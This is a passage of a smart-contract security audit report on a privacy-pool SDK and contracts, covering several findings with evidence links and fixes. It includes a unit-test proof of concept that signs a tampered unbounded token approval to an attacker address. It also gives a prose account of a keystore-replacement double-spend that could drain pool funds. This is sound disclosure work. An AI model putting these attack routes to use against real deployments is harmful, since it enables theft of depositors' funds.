The check is a second line of defence, so reaching it requires the prepared result to have been altered between the two steps. The SDK states that this is in scope rather than leaving it to inference: the comment above the equivalent re-validation in `PoolSessionSwapDeposit` records that a prepared result is "plain serializable data that may have round-tripped through UI state / storage / a backend, so the prepare-time checks are not enough". A result that has been through a backend or through browser storage has left the process that produced it, and that is the boundary the helper exists to police.

What distinguishes this site from the other members of the family is that nothing stands behind it. On the two asserting sibling paths the transaction reaches `PoolVault.transact`, which verifies a proof, so a tampered payload is rejected on chain and the cost is a failed transaction. Here there is no on-chain step to fail, because the tampered payload need not go to the pool at all: the target is whatever the result names. The signature is produced by the user's own wallet, so the transaction is valid, and the loss is bounded only by what that account holds or has approved. The helper's own documentation gives the worst case as an unbounded ERC-20 approval, and the unchecked `value` field adds a native transfer to it.

The prepared result also carries `spentNotes`, `spentNullifiers` and `changePendingNotes`, which `executeSelfSubmitBatch` passes to `persistBatchNoteUpdates` after the receipt confirms. That call does verify its inputs, matching the expected nullifiers against the `Transacted` logs in the receipt before marking any note spent, so a tampered transaction does not corrupt local note state. The defect is confined to what gets signed.

#### Proof of concept

`prepared-tx-passthrough.test.ts` is a Vitest file of six tests, written against an unmodified `packages/sdk/src`. Save it as `prepared-tx-passthrough.test.ts` in `packages/sdk/test/unit/services/` and run it from `packages/sdk` with `npx vitest run test/unit/services/prepared-tx-passthrough.test.ts`. All six pass at this commit.

The first three construct a `SelfSubmitBatchPrepareResult` that claims to be a batch withdrawal and is in fact an unbounded `approve` to an attacker, hand it to `submitSelfSubmitBatch`, and observe the target, the calldata and the native value arriving at the wallet boundary byte for byte as supplied. The second of the three isolates `value`: the target and calldata are the genuine `relayBatch` ones and only the native value has been changed, and it is forwarded anyway.

The last three are the control, and they are what makes the first three mean something. They feed the identical payloads to `assertPreparedTxMatches` anchored to the relay contract and `relayBatch`, which is the check the two sibling submit sites apply, and it rejects both the wrong-target case and the wrong-calldata case with `UnexpectedTransactionTarget`. The third confirms that a genuine `relayBatch` transaction passes that same assertion, so the check distinguishes tampered from legitimate traffic rather than rejecting everything.

```ts
import { encodeFunctionData } from "viem";
import { describe, expect, it, vi } from "vitest";

import type { Address, Hash, Hex, INoteManager, ITransactOrchestrator } from "../../../src/internal.js";
import {
    assertPreparedTxMatches,
    BatchWithdrawOrchestrator,
    PP_RELAY_BATCH_ABI,
    UnexpectedTransactionTarget,
} from "../../../src/internal.js";

// The legitimate target and shape of a self-submit batch: prepareSelfSubmitBatch always
// returns encodeRelayBatch's output, which is `to` = the relay contract, `data` = relayBatch
// calldata, `value` = "0x0".
const RELAY = "0xdddddddddddddddddddddddddddddddddddddddd" as Address;
const TOKEN = "0xbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb" as Address;
const ATTACKER = "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee" as Address;
const TXHASH = "0x00000000000000000000000000000000000000000000000000000000000000ff" as Hash;

const ERC20_APPROVE_ABI = [
    {
        type: "function",
        name: "approve",
        stateMutability: "nonpayable",
        inputs: [
            { name: "spender", type: "address" },
            { name: "amount", type: "uint256" },
        ],
        outputs: [{ name: "", type: "bool" }],
    },
] as const;

// The payload assertPreparedTxMatches' own docstring names as the thing it exists to stop.
const APPROVE_MAX_CALLDATA = encodeFunctionData({
    abi: ERC20_APPROVE_ABI,
    functionName: "approve",
    args: [ATTACKER, (1n << 256n) - 1n],
}) as Hex;

const RELAY_BATCH_CALLDATA = encodeFunctionData({
    abi: PP_RELAY_BATCH_ABI,
    functionName: "relayBatch",
    args: [[], [], []],
}) as Hex;

function makeOrchestrator() {
    const submit = vi.fn(async () => TXHASH);
    const core = { submit } as unknown as ITransactOrchestrator;
    const noteManager = { getNotes: vi.fn(() => []) } as unknown as INoteManager;
    return { submit, orchestrator: new BatchWithdrawOrchestrator({ core, noteManager }) };
}

function preparedResult(to: Address, callData: Hex, value: Hex) {
    return { to, callData, value, spentNotes: [], spentNullifiers: [], changePendingNotes: [] };
}

describe("submitSelfSubmitBatch forwards a prepared transaction unvalidated", () => {
    it("signs an arbitrary target and calldata taken from the prepared result", async () => {
        const { submit, orchestrator } = makeOrchestrator();

        // A SelfSubmitBatchPrepareResult is plain serializable data. This one claims to be a
        // batch withdrawal and is an unbounded ERC-20 approval to an attacker.
        const hash = await orchestrator.submitSelfSubmitBatch(
            preparedResult(TOKEN, APPROVE_MAX_CALLDATA, "0x0" as Hex),
        );

        expect(submit).toHaveBeenCalledWith({
            to: TOKEN,
            data: APPROVE_MAX_CALLDATA,
            value: "0x0",
        });
        expect(hash).toBe(TXHASH);
    });

    it("forwards a non-zero value although the result type documents it as 0x0", async () => {
        const { submit, orchestrator } = makeOrchestrator();

        // `value` is a separately unchecked field: the target and calldata here are the
        // legitimate ones, so only the value is wrong.
        await orchestrator.submitSelfSubmitBatch(
            preparedResult(RELAY, RELAY_BATCH_CALLDATA, "0xde0b6b3a7640000" as Hex),
        );

        expect(submit).toHaveBeenCalledWith({
            to: RELAY,
            data: RELAY_BATCH_CALLDATA,
            value: "0xde0b6b3a7640000",
        });
    });

    it("never calls the wallet with a rewritten target: the three fields pass through verbatim", async () => {
        const { submit, orchestrator } = makeOrchestrator();
        const prepared = preparedResult(TOKEN, APPROVE_MAX_CALLDATA, "0x1" as Hex);

        await orchestrator.submitSelfSubmitBatch(prepared);

        const [arg] = submit.mock.calls[0] as unknown as [{ to: string; data: string; value: string }];
        expect(arg.to).toBe(prepared.to);
        expect(arg.data).toBe(prepared.callData);
        expect(arg.value).toBe(prepared.value);
    });
});

describe("the assertion the two sibling submit sites apply", () => {
    it("rejects the same payload when anchored to the relay contract and relayBatch", () => {
        expect(() =>
            assertPreparedTxMatches(
                { to: TOKEN, data: APPROVE_MAX_CALLDATA, value: "0x0" as Hex },
                { to: RELAY, abi: PP_RELAY_BATCH_ABI, functionName: "relayBatch" },
            ),
        ).toThrow(UnexpectedTransactionTarget);
    });

    it("rejects correct calldata sent to the wrong target", () => {
        expect(() =>
            assertPreparedTxMatches(
                { to: TOKEN, data: RELAY_BATCH_CALLDATA, value: "0x0" as Hex },
                { to: RELAY, abi: PP_RELAY_BATCH_ABI, functionName: "relayBatch" },
            ),
        ).toThrow(UnexpectedTransactionTarget);
    });

    it("accepts a legitimate relayBatch transaction, so the check does not reject valid traffic", () => {
        const decoded = assertPreparedTxMatches(
            { to: RELAY, data: RELAY_BATCH_CALLDATA, value: "0x0" as Hex },
            { to: RELAY, abi: PP_RELAY_BATCH_ABI, functionName: "relayBatch" },
        );
        expect(decoded.functionName).toBe("relayBatch");
    });
});
```

The tests exercise the orchestrator directly with a stub in place of `TransactOrchestrator`, so they establish that `submitSelfSubmitBatch` performs no validation of its own. They do not run a wallet. The claim that the three fields survive the rest of the journey unchanged rests on reading `TransactOrchestrator.submit`, `PoolVaultInteractor.submitTransaction` and the two `IWalletInteractor` implementations, each of which passes its argument through without rewriting a field.

#### Recommendation

We recommend calling `assertPreparedTxMatches` in `submitSelfSubmitBatch` before the prepared transaction reaches `core.submit`, anchored to `PP_RELAY_BATCH_ABI` and the function name `relayBatch`, and rejecting any `value` other than `0x0` in the same place, since `encodeRelayBatch` sets that field to the literal zero and no legitimate self-submit batch carries native value. To let the same call pin the target, add the relay contract address to `SelfSubmitBatchPrepareResult` and populate it in `prepareSelfSubmitBatch` from the `relayContractAddress` the caller supplied, so the execute step compares against a value recorded at prepare time rather than against the `to` field it is meant to be checking. The two asserting sibling paths, `PoolSessionTransfer.executeTransfer` and `PoolSessionWithdraw.executeWithdraw`, are the shape to copy, including their habit of supplying the native value as a literal at the call site instead of carrying it through the result object.

#### Verification

**Verdict: CONFIRMED** by an executed proof of concept. The drop path, the run command and the expected output are given in the proof-of-concept section above.

### #025 — `PoolSessionWithdrawAndSwap` never checks the quote's addresses against `approvedRouters`

**Severity:** Low · **Location:** `packages/swaps/contracts/src/RelaySwaps.sol` · **Bug:** Medium · **Payout:** Medium · **Novelty:** NEW · **Reach:** AUTH · **Root cause:** RC-03 (3 findings) · **Status:** Open

#### Description

When a pool operation involves a swap, the SDK does not route the trade itself. It asks an aggregator for a route and binds that route's calldata into the zero-knowledge proof, so that nobody, the relayer included, can alter it between proving and execution. A route names two addresses the on-chain contract will act on: the contract the swap call is made to, and the address the user's tokens are approved to. Those two addresses carry the whole trust decision, because the calldata itself is forwarded without being parsed, so the contract keeps an owner-managed allowlist of vetted routers and refuses any route whose two addresses are not on it. The SDK sessions ask that same allowlist before proving, so a bad route is refused before a user has spent anything generating a proof for it.

**Where it breaks.** One of the five places where the SDK binds a route into a proof does not ask. The withdraw-and-swap session takes the two addresses out of the quote and proves against them with no allowlist read at all, so a route from a subverted quote source is discovered only after the proof has been generated and the transaction has reverted on chain. No funds are at risk, because the on-chain allowlist runs before anything is withdrawn and rejects the route there. What is lost is the user's proving time and the relayer's gas, and, more durably, the truth of the comment in the contract that justifies forwarding unparsed calldata to a router at all: that justification rests on three guarantees, and one of the three is the SDK's own independent check, which this path does not make.

In the SDK, four session classes obtain a swap route from an `ISwapQuoteProvider` and bind the route's calldata into a zero-knowledge proof. The quote names two addresses that matter on chain: `transactionTo`, the aggregator contract the swap call is made to, which the on-chain routing tuple carries as `swapTarget`, and `approvalAddress`, which receives the scoped ERC-20 approval. `RelaySwaps` keeps an owner-managed `approvedRouters` allowlist and requires both addresses to be on it.

Three of those session classes ask the allowlist themselves before proving. Each caches the allowlist through its `rpcInteractor`, asserts both addresses, and throws `UnallowedLiFiAddress` on a miss. Counting proof-binding quote sites rather than classes, because `PoolSessionReshieldCrosschain` has two independent ones, the tally is five sites, four of which assert:

| proof-binding quote site | asserts against `approvedRouters` | anchor used for the allowlist read |
| --- | --- | --- |
| `PoolSessionSwapDeposit.prepareSwapAndDeposit` | yes, on both addresses | the session's own `relaySwapsAddress` |
| `PoolSessionReshield.prepareReshieldQuote` | yes, on both addresses | `relayerInfo.processorAddress` |
| `PoolSessionReshieldCrosschain.prepareReshieldCrosschainQuote` | yes, on both addresses | `relayerInfo.processorAddress` |
| `PoolSessionReshieldCrosschain`, the gas-swap quote that funds a Mainnet-destination route's native bridge fee | yes, on both addresses | the processor address passed in |
| `PoolSessionWithdrawAndSwap.prepareSwapQuote` | no | none |

The two remaining provider calls, the sizing estimates in `PoolSessionReshield` and `PoolSessionReshieldCrosschain`, discard the calldata and never prove against it, so they need no assertion and are not counted.

The absence in `PoolSessionWithdrawAndSwap` is complete rather than partial. The file's import block brings in the two calldata-verification ABIs but neither the allowlist ABI nor the `UnallowedLiFiAddress` error, it declares no allowlist cache where its three siblings each declare one, and it makes no such call. Its unit test file contains no reference to `approvedRouters`, while the sibling test files do.

The comment in `RelaySwaps` that explains why forwarding arbitrary calldata is acceptable names the SDK check as one of its reasons:

> Forwarding arbitrary calldata to a vetted router is safe by construction: swapTarget AND approvalAddress are allowlisted (approvedRouters), and the full swapCalldata is proof-bound via the transact context hash, the relayer can change neither the target nor the calldata after the user proves. The SDK independently verifies both addresses against approvedRouters before proving (defense in depth). On-chain parsing of aggregator calldata is infeasible for a generic swap and unnecessary given those two guarantees.

The first two reasons hold for every path. The third, the SDK's independent verification, does not hold for withdraw-and-swap. The withdraw-and-swap design document repeats the claim, describing the SDK's validation of `swapTarget` and `approvalAddress` as one of the primary guarantees sitting behind the on-chain forward. The same document's own per-function checklist for `prepareSwapQuote` omits the allowlist, so the two halves of the document disagree, and the constant that carries the allowlist ABI is annotated as being used by `PoolSessionSwapDeposit` and `PoolSessionReshield`, which is the author's mental set of callers and does not include this one.

The check this path does have is not a substitute, because it is a read addressed to the contract under suspicion. `PoolSessionWithdrawAndSwap` verifies the recipient encoded in the LiFi calldata by calling a calldata-verification facet, and the address it calls is `transactionTo`, the address the quote supplied:

```ts
const decoded = await this.rpcInteractor.readContract({
    address: lifiDiamondAddress,
    abi: isCrossChain ? CALLDATA_VERIFICATION_EXTRACT_MAIN_ABI : CALLDATA_VERIFICATION_EXTRACT_SWAP_ABI,
    functionName: isCrossChain ? "extractMainParameters" : "extractGenericSwapParameters",
    args: [lifiTransactionData],
});
```

A contract at an attacker-named address answers that read with whatever it likes, including the recipient the SDK expects, so the guard confirms the claim against its own source. The helper's own documentation states what rests on it, saying that for cross-chain paths there is no on-chain backstop and this is the only pre-proof defense. The remaining `swapTarget` and `approvalAddress` comparisons in the file check the relayer-signed routing against the quote the SDK already holds, which is self-consistency rather than containment, and they are conditional on the expectation fields being present.

One qualification belongs with that, because it bounds how far the self-approving read goes: the LiFi ERC20Proxy, the separate contract that receives the token approval on that aggregator, is itself on `approvedRouters`, and a target that satisfies the on-chain allowlist without implementing the calldata-verification facet makes the read throw, so the SDK does fail closed in that direction. The gap is the missing containment check, not a second route past the allowlist.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L263-L280
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/swaps/contracts/src/RelaySwaps.sol#L363-L372
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionWithdrawAndSwap.ts#L496-L522
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/sdk/src/services/poolSessions/PoolSessionReshield.ts#L259-L268

#### Impact

No funds are at risk, and the reason is what sets the ceiling here. `RelaySwaps.execute` requires both `approvedRouters[swapTarget]` and `approvedRouters[approvalAddress]` before it calls `POOL.transact`. A quote naming an address that is not on the allowlist reverts at those requires, with `RelaySwaps_InvalidSwapTarget` or `RelaySwaps_InvalidApprovalAddress`, and they run earlier in the same function than the pool withdrawal, so the nullifiers stay unspent, the notes stay intact, no fee is paid and no approval is granted. The on-chain allowlist is the control, and it is present and correctly ordered.

What is lost is the fail-fast property the other three paths have, and the truth of a comment that a future reader will rely on. Someone whose quote source has been subverted, whether that is a compromised aggregator API, an intercepted response, or an integrator-supplied `ISwapQuoteProvider`, discovers the problem only after a Groth16 proof has been generated and a transaction has reverted. The codebase treats proving time as the reason this check exists at all, and the relayer's fee commitment has an expiry window that the round trip consumes. Repeated, it is a way to waste a user's time and a relayer's gas rather than a way to take anything.

The comment is the part that outlives the incident. It is the written justification for forwarding arbitrary calldata to a router without parsing it, and one of the three legs it stands on is not true of this path. A later change that narrows the on-chain allowlist check, on the reasoning that the SDK already covers it, would be reasoning from a statement that is false today.

A second inaccuracy sits in the same file and points the other way: the comments saying that for cross-chain paths there is no on-chain backstop overstate the exposure, since the router allowlist does run on cross-chain. What is absent there is the recipient and minimum-output guard, not the allowlist.

#### Recommendation

We recommend porting the allowlist assertion into `PoolSessionWithdrawAndSwap` from `PoolSessionReshield`, which already has the form this session needs: it reads `approvedRouters` through the `rpcInteractor` it already holds, anchored to `relayerInfo.processorAddress`, which this session also already receives. Call it on `swapQuote.transactionTo` and `swapQuote.approvalAddress` immediately after the quote is matched against the request in `prepareSwapQuote`, and mirror it in `relayWithdrawAndSwap` so a caller that assembles the relay step itself is covered too. No new session configuration is required. Lift the assertion into one shared helper and call it from all four sessions, so a fifth path added later inherits it rather than having to remember it, which is the failure mode this one represents. We also recommend striking the clause in the `RelaySwaps` comment that credits the SDK with independently verifying both addresses against `approvedRouters` before proving, since that is the one of its three stated guarantees that does not hold for every path, and the other two do. Separately, the comments in `PoolSessionWithdrawAndSwap` stating that cross-chain has no on-chain backstop should say that the missing cross-chain guard is the recipient and minimum-output check, since the router allowlist runs on both.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #026 — The documented recovery from a frozen keystore mints a second nullifying key for every account

**Severity:** Low · **Location:** `agents/deviations.md` · **Bug:** Medium · **Payout:** Low · **Novelty:** NEW · **Reach:** PRIV · **Kill chain:** KC-02 · **Status:** Open

#### Description

A depositor puts money into the pool and gets back a note. Spending it later is a zero-knowledge proof rather than a signature from a known address, so nothing on chain says which deposit is being spent. What stops a note being spent twice is a nullifier: one value per note, derived from the account's nullifying key, published with every spend, and refused by the pool if it has been seen before. Account identity and that key live in a second contract, the keystore, where an account registers once and is then refused any further registration.

The keystore's registration tree has a fixed capacity and anyone may register into it, so it can be filled, and once it is full registration reverts for good: no new account can be created, and no new user can spend or exit. An in-place upgrade preserves storage and so cannot reclaim the space, which leaves deploying a fresh keystore as the only way to reopen registration. The repository documents that recovery and names the remedy: every existing account re-registers on the fresh contract, re-inserting the identical leaf it held before. That is the only way back for a frozen pool, so an operator under pressure is meant to take it.

**Where it breaks.** The pool and the keystore each remember something the other relies on, and only one of those memories survives the swap:

- the pool keeps its record of spent nullifiers in its own storage, and repointing it at a new keystore writes nothing to that record, so it still holds every note ever spent under the old key;
- the keystore keeps the write-once entry that gives an account exactly one nullifying key, and a fresh instance starts with that empty, so every account that has already registered may register again, with whatever key hash it supplies.

Nothing requires the second key to match the first. Re-registration therefore restores a frozen account and mints it a second nullifying key in the same transaction, and a note that has already been spent now has a second, different nullifier that the pool has never seen.

Every note already withdrawn can be withdrawn again, with proofs a correct verifier accepts at every step, and because the funds come out of the pool's shared balance the loss falls on the depositors who have not withdrawn yet.

In `PoolVault`, a deposit becomes a note commitment in a Merkle tree, and a spend proves ownership of that commitment in zero knowledge while publishing a nullifier, `Poseidon(privateNullifyingKey, commitment)`. `PoolVault` records every nullifier it has seen in the `spentNullifiers` mapping of its `PoolVaultStorage` struct and rejects a repeat. That mapping is the entire double-spend defence, and it rests on one arithmetic condition: a commitment must have exactly one usable nullifying key. Two keys over one commitment produce two different nullifiers, and `spentNullifiers` will have recorded only the first.

Account identity lives in a separate contract, `Keystore`. An account registers once through `Keystore.setAuthPolicy`, which inserts a leaf `Poseidon(account, nullifyingKeyHash, authDigest)` into a keystore Merkle tree and records the account's key hash in the `nullifyingKeys` mapping. Both of `PoolVault`'s spend paths, `transact` and `ragequit`, require through `Keystore.isKnownRoot` that the keystore root a proof was built against is one that keystore still recognises; they differ in that `transact` also pins its proof to the association set, the published allowlist of approved deposits, while `ragequit` consults no association-set root and exits a note in the clear.

The repository ships an intentional-deviations register at `agents/deviations.md`. Its `INTL-12` row covers `PoolVault.setKeystore`, the `UPGRADER_ROLE`-gated setter that repoints the vault at a different keystore contract; the row accepts the absence of an on-chain coherence check and prescribes an operating procedure in its place:

> "Keystore root history lives in the Keystore, not PoolVault, so continuity can't be asserted from PoolVault; the safe path is an in-place UUPS keystore upgrade (preserving `isKnownRoot` history), never a fresh keystore (no known roots → freezes transact+ragequit for existing notes)."
>
> `INTL-12`, Intentional Deviations Register

The mechanics behind that are accurate. `Keystore.initialize` takes a liveness period and a maximum tree size, and no root value. `_updateRoot`, the only writer of the `currentRoot` and `previousRoots` fields `isKnownRoot` reads, is `internal`, and no caller-supplied root reaches them from anywhere else: across all 15 external functions on `Keystore` and all 16 declarations in `IKeystore`, a seeding or import primitive in either would falsify this, and there is none. A fresh instance therefore answers `isKnownRoot` false for every root the old instance knew, so both spend paths close for existing notes, exactly as the row says.

What the row does not say is that the same fresh instance also starts with an empty `nullifyingKeys` mapping, and that mapping is the whole enforcement of one nullifying key per account. Both registration entrypoints, `setAuthPolicy` and the relayed `setAuthPolicyWithSig`, funnel into one internal function whose first precondition is the guard:

```solidity
// Keystore._setAuthPolicy
require($.nullifyingKeys[_account] == 0, Keystore_AuthPolicyAlreadySet());
```

`PoolVault.setKeystore` assigns `$.keystore`, emits `KeystoreSet`, and writes nothing else; `stateTree`, `spentNullifiers` and `commitments` are fields of `PoolVaultStorage` and survive the repoint untouched. A replacement keystore therefore re-arms that guard for every account that has ever registered, against a nullifier set that still remembers every note those accounts have already spent.

The circuits do not close the gap. `Transact.circom` builds the keystore leaf through `KeystoreLeaf` as `Poseidon(ownerAddress, Poseidon(privateNullifyingKey), authDigest)` and constrains `authorizationProof.out === keystoreRoot`, which proves one leaf naming an `ownerAddress` is in the tree and nothing about it being the only one. The commitment carries no key term: `NoteCommitment` hashes `noteAddressHash`, `tokenId`, `value`, `metadata` and `label`, and `noteAddressHash` is `Poseidon(ownerAddress, noteSecret)`. Across every `.circom` file under `packages/circuits/circuits/`, `nullifyingKeyHash` occurs only inside `KeystoreLeaf` and never on the commitment path; a constraint feeding the key hash into `noteAddressHash`, or any non-membership argument over the keystore tree, would falsify this, and neither exists. In `packages/contracts/src` the only external reader of `nullifyingKeys` is `PrivacyPoolRelay.registerAndRelay`.

A register row deters by the cost it states, so it holds while that cost is the larger one. The case where it stops being the larger one is an exhausted keystore. The keystore tree has a fixed capacity and `Keystore.setAuthPolicy` is permissionless, so anyone can consume that capacity by registering accounts they control. When the tree is full, the `keystoreTree.size + 1 <= maxKeystoreTreeSize` precondition in `_setAuthPolicy` reverts with `Keystore_KeystoreTreeFull`, no further account can ever register, and no new user can ever spend or exit. All four shipped configurations in `packages/contracts/script/registries/ChainConfigRegistry.sol` set `maxKeystoreTreeSize` to 262,144, and `Keystore.setMaxKeystoreTreeSize` cannot lift it in practice, because every compiled circuit pins the keystore tree depth to 18, as `Transact(n, m, 22, 18, 18)` across all 25 `transact` variants and as `Ragequit(18)`. An in-place UUPS upgrade preserves storage, the property `INTL-12` prefers it for, so it cannot reclaim tree space either. That leaves a fresh keystore as the only way to restore registration.

Re-registration then does two things at once: it restores a frozen account, and it mints that account's second nullifying key in the same transaction. Issue `#580`, which the `INTL-12` row cites in its Area column, describes the recovery as one where "each must re-register the identical auth leaf (same `nullifyingKeyHash` / `authDigest`, via `setAuthPolicy`, which succeeds because the fresh keystore has `nullifyingKeys[account] == 0`)". Nothing enforces the word identical. `_setAuthPolicy` inserts whatever key hash the caller supplies, subject only to the `_nullifyingKeyHash != 0` and `_nullifyingKeyHash < SNARK_SCALAR_FIELD` preconditions beside the write-once guard. A depositor who registers a fresh key and re-spends notes they have already spent produces valid proofs at every step, against a verifier behaving correctly.

The row also closes with "Both are `UPGRADER_ROLE`-gated (timelocked)", and no timelock exists. A case-insensitive search for "timelock" across `packages/contracts/src` and `packages/contracts/script` returns five hits, all NatSpec, and the `DEFAULT_ADMIN_ROLE` declaration in `RolesConstants.sol` puts it outside this codebase and on a different role: "Intended to be held by Canon Guard (external timelock governance), not by an on-chain timelock implemented inside this repo's contracts." A repository-wide search for `TimelockController` outside `node_modules` and build output returns no files. A timelock contract, or `UPGRADER_ROLE` assigned to one along the deploy path, would falsify this claim.

Key rotation is not a route to the same problem. `Keystore.updateAuthPolicy` reads the account's nullifying key hash out of `nullifyingKeys` rather than from the caller, and replaces the existing leaf in place instead of appending one, which is what `docs/tech-design/key-architectural-concepts.md` means by "The nullifier derivation remains unchanged (`Poseidon(privateNullifyingKey, commitment)`) regardless of auth method, preventing double-spend across auth migrations".

Running `forge test --match-path test/unit/Keystore.t.sol` from `packages/contracts` reports 43 passed, 0 failed, including two 1,000-run fuzz cases asserting the second-leaf revert, so the write-once guard holds at this commit. No circuit was compiled, no proof generated and no keystore migration simulated, so the double-spend is argued from the constraint set and the storage layout rather than demonstrated. The trigger is one `UPGRADER_ROLE` transaction performed correctly and for a stated reason, so no unprivileged party can bring it about; the capability it opens lands on unprivileged accounts.

#### Evidence

- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/agents/deviations.md#L22-L22
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/Keystore.sol#L202-L216
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/contracts/src/contracts/PoolVault.sol#L265-L270
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/circuits/circuits/templates/Transact.circom#L102-L115
- https://github.com/0xbow-io/v2-monorepo/blob/638bf8f4a0f4ef26761e439a338c8db6667dc30b/packages/circuits/circuits/templates/Transact.circom#L230-L233

#### Impact

The double-spend is owner-side. An account re-spends its own notes, so the per-note `noteSecret` is no barrier and no other user's note is touched. The shortfall lands on the pool's shared liquidity, so the loss falls on whoever withdraws last. Proceeds go straight back in: `PoolVault.deposit` applies no cap and no cooldown, and nothing ties a deposit to a prior withdrawal, so the holder of one small note can cycle deposit and re-spend until the vault is empty. The ceiling is the vault balance rather than what the attacker put in.

Pausing does not contain it. `PoolVault.transact` carries `whenNotPaused` and requires the proof's association-set root to equal the registry's latest root, so it can be shut off. `PoolVault.ragequit` carries neither, and `Ragequit.circom` derives its nullifier identically to `Transact.circom`, so the second exit stays open while the first is closed. Nothing repairs the state afterwards. `spentNullifiers` is keyed on the raw nullifier value with no key or version discriminator, and nothing records which key spent a given note, so the mapping cannot tell a second key from a second note. Detection is after the fact, from the vault balance falling below the sum of unspent note values, because every individual withdrawal is well formed.

#### Recommendation

We recommend correcting the `INTL-12` row first, because it is what an operator reads under pressure. State that a replacement `Keystore` resets `nullifyingKeys` and re-arms the write-once guard for every registered account, so the cost of the fresh-keystore path is a loss of nullifier uniqueness and not only a freeze. Strike "(timelocked)", which no contract in this repository implements. Put the same sentence as a comment beside the `nullifyingKeys[_account] == 0` guard in `Keystore._setAuthPolicy`, since that guard is what a future change would remove.

We then recommend closing the path the row leaves open. If reclaiming keystore capacity is the reason a replacement would ever be considered, the shape that does not re-arm the guard is an in-place UUPS upgrade that clears `keystoreTree` while leaving `nullifyingKeys` populated, with a re-insertion entrypoint that reads the account's stored key hash the way `Keystore.updateAuthPolicy` already does instead of accepting one from the caller. For the invariant itself, bind the key into the note by deriving `noteAddressHash = Poseidon(ownerAddress, nullifyingKeyHash, noteSecret)` in `Transact.circom` and `Ragequit.circom`, so a note created under one key does not reconstruct under another and the commitment fails to match, rather than resting on a Solidity guard the proof never checks. That last change needs recompiled circuits and redeployed verifiers, so it belongs with the next circuit release.

#### Verification

**Verdict: CONFIRMED** by reading the named functions against the reviewed commit, and by the permalinked sources in the evidence section above.

### #027 — A payment that arrived on time becomes undiscoverable if the recipient scans late

**Severity:** Low · **Location:** `packages/sdk/src/services/PaymentRequestService.ts` · **Bug:** High · **Payout:** High · **Novelty:** NEW · **Reach:** THEORY · **Root cause:** RC-06 (2 findings) · **Kill chain:** KC-04 · **Status:** Open

#### Description

A recipient who wants to be paid without handing over an identity has their wallet generate a payment request: it mints fresh secrets, keeps them locally, and shares only a tag and a public key. The payer builds a note against those and sends it. Nothing on chain carries an address to look that payment up by, so the recipient's wallet finds it by scanning note events and trying, for each request it still holds, that request's own keys against them. Requests carry an expiry so the wallet is not trying every key it has ever issued against every block forever.

The design already knows what a missed payment costs, and it guards the case it foresaw. The sending side refuses to pay a request that has lapsed, and its comment gives the reason in full: paying a lapsed request risks producing a note that is on-chain, valid, and invisible to the recipient, which it calls a silent loss. Nothing downstream repairs that outcome if it happens, because a note nobody decrypts is a note nobody knows to look for, so the sender's refusal is the whole of the protection.

**Where it breaks.** Both sides consult the same expiry stamp, and they are not asking the same question:

- the sender's guard asks whether the payment is being made inside the request's window, which is a fact about the payment;
- the recipient's scan filter asks whether the scan is being run inside the window, which is a fact about when the wallet happened to be opened.

A payment can pass the first and fail the second. The note lands on chain well inside the seven-day window, the recipient does not open their wallet for a little over eight days, and by then the request has already dropped out of the set the scan draws its keys from, so the one key that would open that note is never tried against it.

The money is on chain and still spendable, the wallet reports nothing whatever, and to the recipient that is indistinguishable from never having been paid.

A payment request carries an expiry. Two different places check it, against two different clocks, and only one of them is about the payment.

On the sending side, `PoolSessionTransfer.prepareFulfillPaymentRequest` checks the expiry at payment time and refuses a request that has lapsed. That is the correct check, and its comment states the reason exactly: paying a lapsed request "risks producing a note that is on-chain, valid, and invisible to them", which it calls a silent loss.

On the receiving side, `PaymentRequestService.getScannableRequests` filters the recipient's own requests against the wall clock at the moment they happen to run a scan:

```ts
async getScannableRequests(): Promise<PaymentRequestRecord[]> {
    const nowMs = BigInt(Date.now());
    return Array.from(this.requests.values()).filter(
        (r) => r.status !== "ARCHIVED" && !this.isExpired(r, nowMs),
    );
}
```

`isExpired` takes the record and that instant and nothing else: `nowMs > BigInt(record.expiresAt) + BigInt(SCAN_EXPIRY_GRACE_MS)`. It has no event parameter, so it cannot consult the block time of the note being scanned even in principle. `PoolSessionNoteDiscovery.discoverNotes` then hands only the survivors of that filter to `scanPaymentRequests`, on the catch-all branch that runs whenever no contacts are supplied.

So the predicate the recipient's wallet evaluates is not whether the payment was made in time, but whether the wallet was opened in time. A payment that was valid when it landed on chain stops being discoverable once the recipient's first scan over that block falls outside the window: seven days by default, per `DEFAULT_REQUEST_EXPIRY_MS`, plus a further day of grace, per `SCAN_EXPIRY_GRACE_MS`.

Nothing else picks it up. The catch-all scan cannot open the payload, for two independent reasons: `prepareFulfillPaymentRequest` seals it to the request's payment public key rather than to the recipient's viewing key, so the catch-all ECDH derives the wrong secret, and `NoteComputationService.deserializeV2` asserts the full note kind and rejects the blind kind that payment-request notes carry. The sync cursor advances past the block regardless, because the non-targeted branch writes `earliestUnresolvedBlock` and a note that was never discovered is never in the unresolved set. A later scan from an explicit starting block does not help either, since the request is still excluded from the scan set by the same filter: the blocks get re-read, but the key that would open them is not in the list.

The precondition is ordinary: issue a request, do not open the wallet for a little over eight days, and have someone pay inside the seven-day window. A merchant invoice or a request shared in a chat behaves exactly like this.

The code names this outcome itself. The grandfathering branch of `isExpired`, which handles records that carry no stamp, is commented with precisely this failure: retro-applying expiry would drop already-shared requests out of the scan set, "making a legitimate later payment land on-chain but stay invisible to the wallet." The same outcome is left in place for stamped records whenever the recipient is offline across the boundary, which makes it an inconsistency in the code's own terms rather than a stated policy.

